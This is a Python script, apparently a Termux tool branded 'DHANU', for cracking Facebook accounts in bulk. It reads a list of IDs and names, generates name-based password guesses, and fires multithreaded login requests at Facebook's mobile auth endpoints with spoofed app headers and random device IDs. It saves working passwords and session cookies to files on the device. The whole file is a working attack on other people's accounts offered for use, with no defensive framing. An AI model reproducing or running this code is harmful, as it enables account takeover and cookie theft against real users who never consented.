'''
@Code written by : Mr SMILE
'''
#▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭#
import os,time,sys,re,string,uuid,json,random,pycurl
from concurrent.futures import ThreadPoolExecutor as threadpol
from os import system as magi
from io import BytesIO
from urllib.parse import quote
import base64
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import uuid
import ipaddress
import calendar
import requests
import mechanize
from bs4 import BeautifulSoup
import subprocess
import base64
import platform
#▬▭▬▭▬▭▬▭[ COLLOR VARIABLES ]▬▭▬▭▬▭▬▭#
a="\x1b[38;5;57m";b="\x1b[38;5;159m";c="\x1b[38;5;250m";d="\x1b[38;5;201m";e="\x1b[38;5;202m";f="\x1b[38;5;25m"
g="\x1b[38;5;253m";h="\x1b[38;5;45m";i="\x1b[38;5;178m";j="\x1b[38;5;11m";k="\x1b[38;5;15m";l="\x1b[38;5;46m"
m="\x1b[38;5;14m";n="\x1b[38;5;9m";o="\x1b[38;5;82m";p="\x1b[38;5;227m";q="\x1b[38;5;162m"
#▬▭▬▭▬▭▬▭[ OPTION VARIABLES ]▬▭▬▭▬▭▬▭#
l1=f"{o}[1]";l2=f"{o}[2]";l3=f"{o}[3]";l4=f"{o}[4]";l5=f"{o}[5]";l6=f"{o}[6]";l7=f"{o}[7]";l0=f"{o}[0]";ekual=f"{e}:-";nuva=f"{e}◼{g}.";cha=f"{e}[♤]{g}."
#▬▭▬▭▬▭▬▭[ ENABLE SDCARD ]▬▭▬▭▬▭▬▭#
try:magi('rm -rf /sdcard/..txt');open('/sdcard/..txt','a').write(' ')
except PermissionError:magi("clear");print(f" {b}Please enable storage permission to continue");magi("termux-setup-storage");exit()
#▬▭▬▭▬▭▬▭[ INSTALL ]▬▭▬▭▬▭▬▭#
try:import requests
except ModuleNotFoundError:
    magi("clear");print(f"{b} Installing Module .... ");magi("pip install requests > /dev/null")
#▬▭▬▭▬▭▬▭[ LINE ]▬▭▬▭▬▭▬▭#
DHANUline=f"\x1b[38;5;63m•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"
#▬▭▬▭▬▭▬▭[ APPEND ]▬▭▬▭▬▭▬▭#
loop=0
oks,cps,psw,DHANU_mthd,numnx,pmsn_ckki=[],[],[],[],[],[]
sys.stdout.write('\x1b]2; DHANU\x07')
#▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭#
def clr_logo():
    magi("clear")
    print(f"""
        {a}██████{c}╗ {a}██{c}╗  {a}██{c}╗ {a}█████{c}╗ {a}███{c}╗   {a}██{c}╗{a}██{c}╗   {a}██{c}╗
        {a}██{c}╔══{a}██{c}╗{a}██{c}║  {a}██{c}║{a}██{c}╔══{a}██{c}╗{a}████{c}╗  {a}██{c}║{a}██{c}║   {a}██{c}║
        {b}██{c}║  {b}██{c}║{b}███████{c}║{b}███████{c}║{b}██{c}╔{b}██{c}╗ {b}██{c}║{b}██{c}║   {b}██{c}║
        {a}██{a}║  {a}██{c}║{a}██{c}╔══{a}██{c}║{a}██{c}╔══{a}██{c}║{a}██{c}║╚{a}██{c}╗{a}██{c}║{a}██{c}║   {a}██{c}║
        {a}██████{c}╔╝{a}██{c}║  {a}██{c}║{a}██{c}║  {a}██{c}║{a}██{c}║ {c}╚{a}████{c}║{c}╚{a}██████{c}╔╝
        {c}╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝
     {d}┌──────────────────────────────────────────────┐
     {d}│ {cha} {f}AUTH       {g}➣      {h}THARINDU N. DHANUSHKA {d}│
     {d}│ {cha} {f}FACEBOOK   {g}➣      {h}DHANU BABAA           {d}│
     {d}│ {cha} {f}STATUS     {g}➣      {h}PREMIUM               {d}│
     {d}│ {cha} {f}TOOLTYPE   {g}➣      {h}FILE                  {d}│
     {d}│ {cha} {f}VERSION    {g}➣      {h}00.00                 {d}│
     {d}└──────────────────────────────────────────────┘""")
#▬▭▬▭▬▭▬▭[ MAIN DEF ]▬▭▬▭▬▭▬▭#
def DHANU_main():
    clr_logo()
    print(f" {l1} {g}➣ {i}FILE CLONING\n {l0} {g}➣ {i}EXIT\n{DHANUline}")
    chic_opsn=input(f" {nuva} {j}CHOOSE AN OPTION {ekual} {k} ")
    if chic_opsn in ['1','01','A','a']:DHANU_file()
    elif chic_opsn in ['0','00','O','o']:exit()
    else:print(f"\n{n} You have selected the wrong option..");time.sleep(4);DHANU_main()
#▬▭▬▭▬▭▬▭[ DHANU FILE ]▬▭▬▭▬▭▬▭#
def DHANU_file():
    clr_logo();dmp_in=input(f"  {i}ENTER YOUR FILE {g}➣ {l}EXAMPLE {ekual} {g}/{j}sdcard{g}/{j}file name{g}.{j}txt {g}●●\n{DHANUline}\n {nuva} {j}ENTER FILE PATH {ekual} {k} ")
    try:dmp_ck=open(dmp_in,'r').read().splitlines()
    except FileNotFoundError:print(f"\n{DHANUline}\n {n}File location not found\n Enter File agin...{k}");time.sleep(4);DHANU_file()
    clr_logo()
    print(f" {l1} {i}CUSTOM PASS\n {l2} {i}AUTO PASS\n{DHANUline}")
    auto_pw = input(f" {nuva} {j}CHOOSE PASS {ekual} {k}")
    if auto_pw in ['2','02','2','b']:psw.append("firstlast123");psw.append("first1122");psw.append("last1234");psw.append("first@");psw.append("firstlast");psw.append("first last");psw.append("first123");psw.append("first1234");psw.append("first12345");psw.append("first@123");psw.append("first@1234");psw.append("last123")
    else:
        clr_logo()
        try:ps_limt=int(input(f"    {i}ENTER PASSWORD COUNT {g}➣ {l}EXAMPLE {ekual} {j}10\n{DHANUline}\n {nuva} {j}PASSWORD LIMIT {ekual} {k} "))
        except:ps_limt = 4
        clr_logo()
        print(f" {nuva} {i}EXAMPLE {ekual}  {j}first123 {g}/ {j}firstlast {g}/ {j}last123\n{DHANUline}")
        for x in range(ps_limt):
            inp_ps = f" {nuva} {h}PASSWORD NO {x+1} {ekual} {k} "
            psw.append(input(inp_ps))
    clr_logo()
    print(f" {l1} {m}MATHOD {g}➣ {l}01\n {l2} {m}MATHOD {g}➣ {l}02\n{DHANUline}")
    DHANU_in_mthd = input(f" {nuva} {j}CHOICE MATHOD {ekual} {k} ")
    if DHANU_in_mthd in ['a','A','1','01']:DHANU_mthd.append("A")
    elif DHANU_in_mthd in ['b','B','2','02']:DHANU_mthd.append("B")
    else:DHANU_mthd.append("A")
    clr_logo();DHANUckki=input(f"    {i}Do you went show {l}COOKIE {g}({n}y{g}/{n}n{g}) {i}points {g}●●\n{DHANUline} {nuva} {j}OPTION {ekual} {k} ")
    if DHANUckki in ['y','Y','yes','Yes','1']:pmsn_ckki.append(f'y')
    else:pmsn_ckki.append(f'n')
    with threadpol(max_workers=60) as sifatx:
        clr_logo()
        total_ids = str(len(dmp_ck))
        print(f" {nuva} {i}TOTAL CRACK {ekual} {b}{total_ids}\n {nuva} {i}USE AIRPLANE MOD {g}({n}on{g}/{n}off{g}) {m}3m {i}FRO GOOD RESULT {g}●●\n{DHANUline}")
        for ids_nam in dmp_ck:
            try:ids,names = ids_nam.split('|')
            except:pass
            pswdx = psw
            if 'A' in DHANU_mthd:sifatx.submit(DHANU_f_m1,ids,names,pswdx)
            elif 'B' in DHANU_mthd:sifatx.submit(DHANU_f_m2,ids,names,pswdx)
    print(f"\n{DHANUline}\n {nuva} {q}CREAK PROCESS HAS BEEN COMPLITE {g}●●\n {nuva} {q}TOTAL OK ID {ekual} {m}{str(len(oks))}\n {nuva} {q}FILE SAVE AS {ekual} {p}/sdcard/DHANU-OK&CP.txt\n{DHANUline} {k} ");exit()
#▬▭▬▭▬▭▬▭[ FILE MATHID - 1 ]▬▭▬▭▬▭▬▭#
def DHANU_f_m1(ids,names,pswdx):
    try:
        global loop,oks,cps
        sys.stdout.write(f"\r\r {g}[{m}DHANU-M1{g}] {p}{loop} {k}| {l}OK-{str(len(oks))} {k}| {n}CP-{str(len(cps))} {k} ");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for passx in pswdx:
            pww=passx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            uaD1 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; X655C Build/TP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845465;FBDM/{density=2.0,width=1536,height=2048};FBLC/en_US;FBRV/218114099;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T713;FBSV/7.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            logn_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids, "password":pww,"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            user_info = {"User-Agent":uaD1,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            url = f"https://api.facebook.com/auth/login"
            DHANU_respns = requests.post(url,data=logn_data,headers=user_info,allow_redirects=False).json()
            if 'session_key' in DHANU_respns:
                coki = ';'.join(i['name']+'='+i['value'] for i in DHANU_respns['session_cookies'])
                print(f"\r\r {g}[{m}DHANU-{l}OK{g}] {k}➧ {l}{ids} {k}| {l}{pww}")
                if 'y' in pmsn_ckki:print(f"\r\r COOKIE {g}➣ {p}{coki}\n")
                open("/sdcard/DHANU-FILE-OK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                open("/sdcard/DHANU-FILE-OK.txt","a").write(ids+'|'+pww+'\n')
                uid=str(ids)
                oks.append(ids)
                break
            elif 'www.facebook.com' in DHANU_respns['error']['message']:
                print(f"\r\r {g}[{m}DHANU-{n}CP{g}] {k}➧ {n}{ids} {k}| {n}{pww}")
                open('/sdcard/DHANU-FILE-CP.txt','a').write(ids+'|'+pww+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[ FILE MATHID - 2 ]▬▭▬▭▬▭▬▭#
def DHANU_f_m2(ids,names,pswdx):
    try:
        global loop,oks,cps
        sys.stdout.write(f"\r\r {g}[{m}DHANU-M2{g}] {p}{loop} {k}| {l}OK-{str(len(oks))} {k}| {n}CP-{str(len(cps))} {k} ");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for passx in pswdx:
            pww=passx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            ua2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/219186427;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
            logn_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids, "password":pww,"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            user_info = {"User-Agent":ua2,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            url = f"https://b-graph.facebook.com/auth/login"
            DHANU_respns = requests.post(url,data=logn_data,headers=user_info,allow_redirects=False).json()
            if 'session_key' in DHANU_respns:
                coki = ';'.join(i['name']+'='+i['value'] for i in DHANU_respns['session_cookies'])
                print(f"\r\r {g}[{m}DHANU-{l}OK{g}] {k}➧ {l}{ids} {k}| {l}{pww}")
                if 'y' in pmsn_ckki:print(f"\r\r COOKIE {g}➣ {p}{coki}\n")
                open("/sdcard/DHANU-FILE-OK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                open("/sdcard/DHANU-FILE-OK.txt","a").write(ids+'|'+pww+'\n')
                uid=str(ids)
                oks.append(ids)
                break
            elif 'www.facebook.com' in DHANU_respns['error']['message']:
                print(f"\r\r {m}[DHANU-{n}CP] {k}➧ {n}{ids} {k}| {n}{pww}")
                open('/sdcard/DHANU-FILE-CP.txt','a').write(ids+'|'+pww+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
    
#os.system("clear")
DHANU_main()
